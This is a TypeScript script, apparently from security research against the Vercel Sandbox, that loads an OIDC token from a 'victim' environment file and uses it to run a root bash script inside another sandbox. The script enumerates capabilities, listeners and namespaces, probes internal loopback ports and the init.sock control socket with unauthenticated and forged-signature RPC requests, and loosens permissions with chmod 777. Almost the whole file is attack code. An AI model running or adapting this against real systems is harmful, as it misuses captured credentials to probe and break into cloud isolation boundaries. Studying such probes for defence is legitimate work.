import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const SCRIPT = String.raw`
set +e
echo "===== caps ====="
grep -E "Cap(Inh|Prm|Eff|Bnd|Amb)" /proc/self/status
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}') 2>/dev/null | head -2
which tcpdump strace gdb nc socat curl wget python3 perl ruby 2>/dev/null
echo
echo "===== host netns TCP listeners ====="
sudo ss -tlnp 2>&1
echo "===== UDP listeners ====="
sudo ss -ulnp 2>&1
echo "===== UNIX sockets ====="
sudo ss -xlp 2>&1 | head -40
echo
echo "===== distinct net namespaces ====="
for f in /proc/[0-9]*/ns/net; do echo "$(readlink $f) $f"; done 2>/dev/null | sort | uniq -c | sort -rn | head
echo
echo "===== probe loopback ports banner ====="
for p in 23456 30001 30002; do
  echo "--- port $p ---"
  (exec 3<>/dev/tcp/127.0.0.1/$p; timeout 3 head -c 200 <&3 2>&1 | tr -d '\0'; echo; timeout 3 printf 'GET / HTTP/1.0\r\nHost: x\r\n\r\n' >&3 2>/dev/null; timeout 3 head -c 500 <&3 2>&1 | tr -d '\0') 2>&1 | head -5
done
echo
echo "===== connect RPC paths on 23456/30001/30002 ====="
for p in 23456 30001 30002; do
  echo "--- $p connect SpawnService Ping (unauthenticated) ---"
  printf 'POST /vercel.sandbox.spawn.v1.SpawnService/Ping HTTP/1.0\r\nContent-Type: application/proto\r\nConnect-Protocol-Version: 1\r\nContent-Length: 0\r\n\r\n' | timeout 5 nc 127.0.0.1 $p 2>&1 | head -8
  echo "--- $p grpc reflection ---"
  printf 'POST /grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo HTTP/1.0\r\nContent-Type: application/grpc\r\nContent-Length: 0\r\n\r\n' | timeout 5 nc 127.0.0.1 $p 2>&1 | head -4
done
echo
echo "===== common paths on 23456 ====="
for path in / /health /healthz /status /metrics /version /api /v1 /spawn /ping /_ping; do
  echo "--- $path ---"
  printf "GET $path HTTP/1.0\r\nHost: x\r\n\r\n" | timeout 4 nc 127.0.0.1 23456 2>&1 | head -3
done
echo
echo "===== init.sock auth test (empty/with headers) ====="
sudo chmod 777 /run/vercel/share 2>/dev/null
for hdr in "" "-H 'Content-Type: application/json'" "-H 'Connect-Protocol-Version: 1' -H 'X-Signature: AAAAA' -H 'X-Timestamp: 1234567890'"; do
  echo "--- headers: $hdr ---"
  printf 'POST /vercel.sandbox.spawn.v1.SpawnService/Ping HTTP/1.0\r\nContent-Type: application/proto\r\nConnect-Protocol-Version: 1\r\nContent-Length: 0\r\n\r\n' | timeout 4 socat - UNIX-CONNECT:/run/vercel/share/init.sock 2>&1 | head -5
done
echo
echo "===== /run/vercel/share listing ====="
ls -la /run/vercel/share/ 2>&1
sudo ls -la /run/vercel/share/ 2>&1
echo DONE
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 180_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });